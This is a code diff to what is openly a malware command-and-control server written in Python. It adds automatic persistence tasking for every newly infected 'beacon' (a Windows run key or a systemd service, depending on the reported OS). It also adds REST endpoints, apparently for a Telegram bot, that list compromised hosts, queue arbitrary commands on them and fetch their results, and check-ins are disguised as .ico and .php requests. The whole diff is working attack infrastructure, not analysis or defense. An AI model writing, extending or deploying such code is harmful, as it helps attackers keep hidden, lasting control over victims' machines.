@@ -49,6 +49,15 @@ class C2State:
                 self.tasks[beacon_id] = []
                 self.results[beacon_id] = []
                 logger.info(f"New beacon registered: {beacon_id} ({info.get('ip')})")
+                # Auto-persist for new beacons
+                os_type = info.get("os", "").lower()
+                if "windows" in os_type:
+                    method = "runkey"
+                else:
+                    method = "systemd"
+                task_id = datetime.now().strftime("%Y%m%d%H%M%S%f")
+                self.tasks[beacon_id].append({"task_id": task_id, "command": f"persist {method}"})
+                logger.info(f"Auto-persist ({method}) queued for new beacon {beacon_id} (Task: {task_id})")
             else:
                 self.beacons[beacon_id].update(info)
 
@@ -99,8 +108,8 @@ async def handle_checkin(request: web.Request) -> web.Response:
             return web.Response(status=400)
 
         info = {"ip": request.remote, "last_seen": datetime.now().isoformat(timespec="seconds")}
-        c2_state.update_beacon(beacon_id, info)
 
+        # Parse body BEFORE registering beacon, so we have OS info for correct auto-persist
         if request.method == "POST" and request.can_read_body:
             encrypted_body = await request.text()
             if encrypted_body:
@@ -130,6 +139,7 @@ async def handle_checkin(request: web.Request) -> web.Response:
                     except Exception as e:
                         logger.error(f"Failed to parse telemetry: {e}")
 
+        # Single update_beacon call after all info is gathered
         c2_state.update_beacon(beacon_id, info)
 
         pending = c2_state.get_pending_tasks(beacon_id)
@@ -244,6 +254,33 @@ async def handle_payload_pic(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
+# ── REST API Handlers (for Telegram bot / external tools) ─────────────────
+
+async def handle_beacons(request: web.Request) -> web.Response:
+    """GET /api/v1/beacons — List all registered beacons."""
+    return web.Response(text=json.dumps(c2_state.get_beacons(), indent=2), content_type='application/json')
+
+async def handle_queue_task(request: web.Request) -> web.Response:
+    """POST /api/v1/queue — Queue a command for a beacon."""
+    try:
+        body = await request.json()
+        beacon_id = body.get('beacon_id', '')
+        command = body.get('command', '')
+        if not beacon_id or not command:
+            return web.Response(status=400, text='{"error":"beacon_id and command required"}', content_type='application/json')
+        c2_state.queue_task(beacon_id, command)
+        return web.Response(text=json.dumps({'status': 'queued'}), content_type='application/json')
+    except Exception as e:
+        return web.Response(status=400, text=json.dumps({'error': str(e)}), content_type='application/json')
+
+async def handle_results_api(request: web.Request) -> web.Response:
+    """GET /api/v1/results?beacon_id=X — Get results for a beacon."""
+    beacon_id = request.query.get('beacon_id', '')
+    if not beacon_id:
+        return web.Response(text=json.dumps({'error': 'beacon_id required'}), content_type='application/json')
+    results = c2_state.get_results(beacon_id)
+    return web.Response(text=json.dumps({'results': results}, indent=2), content_type='application/json')
+
 # ── Server Lifecycle ───────────────────────────────────────────────────────
 
 class C2Server:
@@ -348,6 +385,11 @@ class C2Server:
         app.router.add_get(r"/{path:.*\.ico}", handle_checkin)
         app.router.add_post(r"/{path:.*\.ico}", handle_checkin)
         
+        # REST API (Telegram bot / external tools)
+        app.router.add_get("/api/v1/beacons", handle_beacons)
+        app.router.add_post("/api/v1/queue", handle_queue_task)
+        app.router.add_get("/api/v1/results", handle_results_api)
+
         # Results
         app.router.add_post("/api/v1/result", handle_result)
         app.router.add_post(r"/{path:.*\.php}", handle_result)
